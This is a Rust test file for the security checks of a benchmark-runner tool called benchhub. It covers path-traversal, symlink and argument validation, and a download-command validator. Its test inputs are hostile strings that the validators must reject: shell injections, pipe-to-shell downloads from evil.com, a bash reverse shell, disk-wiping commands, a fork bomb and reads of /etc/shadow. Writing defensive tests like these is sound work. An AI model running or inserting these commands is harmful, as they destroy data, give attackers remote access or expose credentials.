use benchhub::bench_config::{filter_safe_custom_args, is_safe_custom_arg, validate_custom_arg};
use benchhub::engine::{validate_download_command, BenchmarkEngine};
use benchhub::models::BenchmarkProfile;
use benchhub::utils::{
    ensure_path_within, is_safe_path, normalize_path, sanitize_filename, sanitize_identifier,
};
use std::path::{Path, PathBuf};
use tempfile::tempdir;

#[test]
fn test_sanitize_identifier_valid_cases() {
    assert_eq!(sanitize_identifier("geekbench6").unwrap(), "geekbench6");
    assert_eq!(
        sanitize_identifier("unigine_superposition").unwrap(),
        "unigine_superposition"
    );
    assert_eq!(
        sanitize_identifier("1.2.3-patch_1+opt").unwrap(),
        "1.2.3-patch_1+opt"
    );
    assert_eq!(sanitize_identifier("7zip").unwrap(), "7zip");
    assert_eq!(sanitize_identifier("cray-simd").unwrap(), "cray-simd");
    assert_eq!(
        sanitize_identifier("Fast (stories260K)").unwrap(),
        "Fast (stories260K)"
    );
    assert_eq!(sanitize_identifier("4.2 (Stable)").unwrap(), "4.2 (Stable)");
    assert_eq!(
        sanitize_identifier("Latest Release").unwrap(),
        "Latest Release"
    );
}

#[test]
fn test_sanitize_identifier_rejects_path_traversal() {
    assert!(sanitize_identifier("../etc").is_err());
    assert!(sanitize_identifier("../../root").is_err());
    assert!(sanitize_identifier("..").is_err());
    assert!(sanitize_identifier(".").is_err());
    assert!(sanitize_identifier("a/../b").is_err());
    assert!(sanitize_identifier("a/../../b").is_err());
}

#[test]
fn test_sanitize_identifier_rejects_slashes_and_null_bytes() {
    assert!(sanitize_identifier("/etc/passwd").is_err());
    assert!(sanitize_identifier("foo/bar").is_err());
    assert!(sanitize_identifier("foo\\bar").is_err());
    assert!(sanitize_identifier("bench\0mark").is_err());
    assert!(sanitize_identifier("\0").is_err());
}

#[test]
fn test_sanitize_identifier_rejects_command_injection_and_control_chars() {
    assert!(sanitize_identifier("bench; rm -rf /").is_err());
    assert!(sanitize_identifier("bench && echo pwned").is_err());
    assert!(sanitize_identifier("`id`").is_err());
    assert!(sanitize_identifier("$(id)").is_err());
    assert!(sanitize_identifier("bench | sh").is_err());
    assert!(sanitize_identifier("bench\nrm -rf /").is_err());
    assert!(sanitize_identifier("bench\r\n").is_err());
    assert!(sanitize_identifier("bench\targ").is_err());
    assert!(sanitize_identifier("bench > /tmp/out").is_err());
    assert!(sanitize_identifier("bench < /tmp/in").is_err());
}

#[test]
fn test_sanitize_filename() {
    assert_eq!(
        sanitize_filename("export_2026.csv").unwrap(),
        "export_2026.csv"
    );
    assert_eq!(sanitize_filename("run.log").unwrap(), "run.log");

    assert!(sanitize_filename("../evil.csv").is_err());
    assert!(sanitize_filename("/tmp/evil.csv").is_err());
    assert!(sanitize_filename("a/b.log").is_err());
    assert!(sanitize_filename("run\0.log").is_err());
    assert!(sanitize_filename("").is_err());
    assert!(sanitize_filename("   ").is_err());
}

#[test]
fn test_normalize_path_resolution() {
    assert_eq!(
        normalize_path(Path::new("/home/user/benchhub/runners/../logs")),
        PathBuf::from("/home/user/benchhub/logs")
    );
    assert_eq!(
        normalize_path(Path::new("/home/user/benchhub/./runners/./7zip")),
        PathBuf::from("/home/user/benchhub/runners/7zip")
    );
    assert_eq!(
        normalize_path(Path::new("/a/b/c/../../d")),
        PathBuf::from("/a/d")
    );
}

#[test]
fn test_ensure_path_within_valid_subpaths() {
    let base = Path::new("/var/data/benchhub/runners");
    let target1 = Path::new("/var/data/benchhub/runners/geekbench");
    let target2 = Path::new("/var/data/benchhub/runners/7zip/1.0/extracted");

    assert!(ensure_path_within(base, target1).is_ok());
    assert!(ensure_path_within(base, target2).is_ok());
    assert!(is_safe_path(base, target1));
}

#[test]
fn test_ensure_path_within_rejects_escape_and_identity() {
    let base = Path::new("/var/data/benchhub/runners");

    // Identical path
    assert!(ensure_path_within(base, base).is_err());

    // Parent escape
    let escape1 = Path::new("/var/data/benchhub/runners/../logs");
    assert!(ensure_path_within(base, escape1).is_err());

    // Root escape
    let escape2 = Path::new("/var/data/benchhub/runners/../../../../etc/passwd");
    assert!(ensure_path_within(base, escape2).is_err());

    // Relative escape
    let escape3 = Path::new("../runners");
    assert!(ensure_path_within(base, escape3).is_err());
}

#[tokio::test]
async fn test_engine_uninstall_rejects_traversal_attack() {
    let dir = tempdir().expect("Failed to create tempdir");
    let base_dir = dir.path().to_path_buf();
    let engine = BenchmarkEngine::new(base_dir.clone());

    // Create an innocent file outside runners
    let secret_file = base_dir.join("secret.txt");
    std::fs::write(&secret_file, "TOP SECRET DATA").unwrap();

    // Attempt traversal uninstall
    let traversal_attack = engine.uninstall("../../secret.txt").await;
    assert!(
        traversal_attack.is_err(),
        "Engine must reject traversal in uninstall"
    );

    // Ensure secret file was not touched or deleted
    assert!(secret_file.exists());
    assert_eq!(
        std::fs::read_to_string(&secret_file).unwrap(),
        "TOP SECRET DATA"
    );
}

#[tokio::test]
async fn test_engine_resolve_executable_rejects_external_traversal() {
    let dir = tempdir().expect("Failed to create tempdir");
    let runner_dir = dir.path().join("runners").join("test_bench");
    std::fs::create_dir_all(&runner_dir).unwrap();

    // Target executable outside runner_dir
    let external_sh = dir.path().join("external_script.sh");
    std::fs::write(&external_sh, "#!/bin/sh\necho HELLO\n").unwrap();

    let malicious_profile = BenchmarkProfile {
        id: "test_bench".to_string(),
        name: "Malicious Traversal Bench".to_string(),
        category: "CPU".to_string(),
        binary_relative_path: Some("../../external_script.sh".to_string()),
        run_cmd: "../../external_script.sh".to_string(),
        ..Default::default()
    };

    let resolved = BenchmarkEngine::resolve_executable(&runner_dir, &malicious_profile);
    // It should NOT resolve to the external script outside runner_dir
    if let Ok(res) = resolved {
        assert_ne!(
            res.full_path, external_sh,
            "Executable resolution must not escape runner_dir"
        );
    }
}

#[test]
fn test_custom_args_safety_validation() {
    // Valid safe flags
    assert!(is_safe_custom_arg("-threads"));
    assert!(is_safe_custom_arg("16"));
    assert!(is_safe_custom_arg("-preset"));
    assert!(is_safe_custom_arg("medium"));
    assert!(is_safe_custom_arg("-tune"));
    assert!(is_safe_custom_arg("film"));
    assert!(is_safe_custom_arg("--benchmark"));
    assert!(validate_custom_arg("-threads").is_ok());

    // Forbidden dangerous flags: -o, --output, -y
    assert!(!is_safe_custom_arg("-o"));
    assert!(!is_safe_custom_arg("--output"));
    assert!(!is_safe_custom_arg("-y"));
    assert!(!is_safe_custom_arg("-o=test.bin"));
    assert!(!is_safe_custom_arg("--output=test.bin"));
    assert!(!is_safe_custom_arg("-y=true"));
    assert!(validate_custom_arg("-o").is_err());
    assert!(validate_custom_arg("--output").is_err());
    assert!(validate_custom_arg("-y").is_err());

    // Path traversal sequence '..'
    assert!(!is_safe_custom_arg("../../../etc/passwd"));
    assert!(!is_safe_custom_arg("foo/../bar"));
    assert!(!is_safe_custom_arg(".."));
    assert!(validate_custom_arg("../secret").is_err());

    // Absolute root paths '/'
    assert!(!is_safe_custom_arg("/etc/shadow"));
    assert!(!is_safe_custom_arg("/bin/bash"));
    assert!(!is_safe_custom_arg("--config=/etc/hosts"));
    assert!(validate_custom_arg("/var/log").is_err());

    // Shell injection characters
    assert!(!is_safe_custom_arg("arg;rm"));
    assert!(!is_safe_custom_arg("arg&&calc"));
    assert!(!is_safe_custom_arg("arg|sh"));
    assert!(!is_safe_custom_arg("`id`"));
    assert!(!is_safe_custom_arg("$(id)"));
    assert!(!is_safe_custom_arg(">file"));
    assert!(!is_safe_custom_arg("<file"));
    assert!(validate_custom_arg("foo;bar").is_err());

    // Test filter_safe_custom_args
    let mixed = "-threads 8 -o /tmp/evil -y --output=out.txt ../traversal -tune film";
    let filtered = filter_safe_custom_args(mixed);
    assert_eq!(filtered, vec!["-threads", "8", "-tune", "film"]);
}

#[test]
fn test_download_command_security_validation() {
    // Valid download commands
    assert!(validate_download_command(
        "wget -nv -c https://example.com/file.tar.gz && tar -xvf file.tar.gz"
    )
    .is_ok());
    assert!(validate_download_command(
        "wget -q -c https://example.com/stream.c -O stream.c && gcc -O3 stream.c -o stream"
    )
    .is_ok());
    assert!(validate_download_command(
        "./configure > /dev/null && make -j$(nproc) && chmod +x bin"
    )
    .is_ok());

    // Forbidden privilege escalation
    assert!(validate_download_command("sudo apt-get install -y foo").is_err());
    assert!(validate_download_command("wget url && sudo make install").is_err());
    assert!(validate_download_command("pkexec rm -rf /").is_err());
    assert!(validate_download_command("su root -c 'id'").is_err());
    assert!(validate_download_command("doas bash").is_err());

    // Forbidden destructive commands
    assert!(validate_download_command("rm -rf /").is_err());
    assert!(validate_download_command("wget url && rm -rf /*").is_err());
    assert!(validate_download_command("mkfs.ext4 /dev/sda1").is_err());
    assert!(validate_download_command("dd if=/dev/zero of=/dev/sda").is_err());
    assert!(validate_download_command(":(){ :|:& };:").is_err());

    // Forbidden pipe-to-shell or reverse shells
    assert!(validate_download_command("curl http://evil.com/setup.sh | bash").is_err());
    assert!(validate_download_command("wget -O- http://evil.com/setup.sh | sh").is_err());
    assert!(validate_download_command("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1").is_err());

    // Forbidden system path access
    assert!(validate_download_command("echo test > /etc/resolv.conf").is_err());
    assert!(validate_download_command("cat /etc/shadow").is_err());
    assert!(validate_download_command("cp malware /root/malware").is_err());
    assert!(validate_download_command("").is_err());
    assert!(validate_download_command("cmd\0injection").is_err());
}

#[test]
fn test_ensure_path_within_symlink_bypass() {
    use std::os::unix::fs::symlink;
    let dir = tempdir().unwrap();
    let base = dir.path().join("base");
    std::fs::create_dir_all(&base).unwrap();

    let outside = dir.path().join("outside");
    std::fs::create_dir_all(&outside).unwrap();

    // Create a symlink inside base pointing to outside
    let sym = base.join("sym");
    symlink(&outside, &sym).unwrap();

    // Now try to resolve a non-existent file inside the symlink
    let target = sym.join("new_file.txt");

    // ensure_path_within should resolve the symlink and reject it because it's outside base
    let result = ensure_path_within(&base, &target);
    assert!(
        result.is_err(),
        "Symlink traversal bypass was successful! Result: {:?}",
        result
    );
}
